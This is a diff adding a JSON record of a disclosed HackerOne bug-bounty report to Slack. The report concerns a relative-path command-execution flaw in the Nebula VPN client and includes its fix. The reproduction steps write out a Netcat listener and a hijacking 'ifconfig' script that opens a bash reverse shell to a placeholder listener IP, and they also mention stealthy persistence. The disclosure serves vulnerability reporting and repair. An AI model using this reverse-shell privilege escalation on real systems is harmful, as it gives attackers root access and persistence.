@@ -1,0 +1,137 @@
+{
+  "id": 784714,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODQ3MTQ=",
+  "url": "https://hackerone.com/reports/784714",
+  "title": "Relative Path Vulnerability Results in Arbitrary Command Execution/Privilege Escalation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-01-28T12:43:33.476Z",
+  "submitted_at": "2020-01-28T12:43:33.476Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jhancock",
+    "url": "/jhancock",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 69,
+    "url": "https://hackerone.com/slack",
+    "handle": "slack",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Slack",
+      "twitter_handle": "slackhq",
+      "website": "https://slack.com",
+      "about": "All your team communication in one place, instantly searchable, and available wherever you go."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-04-01T22:10:32.788Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-03-02T22:10:24.076Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Overview###\nThe Nebula clients for Darwin and Windows call relative paths in \"exec.Command\" to \"ifconfig\" and \"route\" executables on Darwin, and to \"netsh\" on Windows. These commands are entered using relative paths, not absolute paths (such as /sbin/ifconfig). When a binary is run with a relative path, the system uses environmental variables (\"PATH\") to determine the search order of folders that should be searched for the command run. By modifying the environmental variable, an attacker can prioritize an arbitrary path containing a binary of the same name, and it will execute when Nebula runs. \n\nThe affected code can be found at https://github.com/slackhq/nebula/search?q=exec.Command&unscoped_q=exec.Command); specifically:\n\nnebula/tun_darwin.go:45\nnebula/tun_darwin.go:48\nnebula/tun_darwin.go:51\nnebula/tun_darwin.go:56\nnebula/tun_windows:50\nnebula/tun_windows:60\n\n###Steps###\nTo reproduce this attack, open a terminal on a MacOS system running the Darwin Nebula client and a terminal on a Linux or MacOS system to catch the shell. Perform the following steps:\n1. On a host accessible to the MacOS system, run the following command to start a Netcat listener:\n`sudo nc -nvlp 443`\n\n2. On the MacOS system with the Nebula client, run the command \"whoami\" (or id) and \"hostname\"\n\n3. Nebula attempts to call the \"ifconfig\" command, including three variables. A script file containing a pass-through to ifconfig must be created, but should include a bash reverse shell connecting to the IP address of the system in step 1 (\"LISTENER_IP_ADDRESS\"). Create a file in the /tmp/ folder called \"ifconfig\". Enter the following code the file:\n```\n#!/bin/bash\nbash -i >& /dev/tcp/LISTENER_IP_ADDRESS/443 0>&1 &\nDEVICE=$1\nCIDER=$2\nIP=$3\n/sbin/ifconfig $1 $2 $3\n\n4. Make the script executable by running `chmod +x /tmp/ifconfig`\n\n5. Run the Nebula client with the command `sudo ./nebula -config config.yml`. When the ifconfig command is called, it will execute the reverse shell command in the script and then continue connecting.\n\n6. On the host in step 1, a reverse Bash shell connects. Run the command \"whoami\" (or id) and \"hostname\" and verify the user is now root, and the hostname is the hostname of the MacOS computer in step 2.\n\nNote: To perform this attack on Windows, a custom binary would need to be compiled and named \"netsh\" but the principles are the same on each OS. \n\n###Resolution###\nModify the paths on the affected lines to absolute paths. For example, line 45 of nebula/tun_darwin.go reads:\n\n```if err = exec.Command(\"ifconfig\", c.Device, c.Cidr.String(), c.Cidr.IP.String()).Run(); err != nil {```\n\nModify this snippet to provide an absolute path, as shown below:\n\n```if err = exec.Command(\"/sbin/ifconfig\", c.Device, c.Cidr.String(), c.Cidr.IP.String()).Run(); err != nil```\n\n## Impact\n\nBecause Nebula must be run with root/sudo permissions, this can be an effective privilege escalation technique. A standard user can modify the environment and create files in /tmp, and when Nebula is run, the command will open a reverse shell as the root user (see screenshots). Additionally, this could be used to maintain stealthy persistence on an affected machine. Because Nebula must restart to pick up changes to the config.yaml (such as firewall rules), it is reasonable to believe an attacker with presence on the box could modify the PATH settings and script, and the process would be restarted at some point in the future.",
+  "bounty_amount": "750.0",
+  "formatted_bounty": "$750",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-04-01T22:10:24.187Z",
+  "allow_singular_disclosure_after": -191965752.24114,
+  "singular_disclosure_allowed": true,
+  "vote_count": 10,
+  "voters": [
+    "tinmo",
+    "bitsscrambler",
+    "santieich",
+    "trainr3kt",
+    "cryptographer",
+    "ram15",
+    "jimithefox",
+    "shimura",
+    "hex0x0f",
+    "gustavetxc01"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "physical",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 40624,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/slackhq/nebula",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
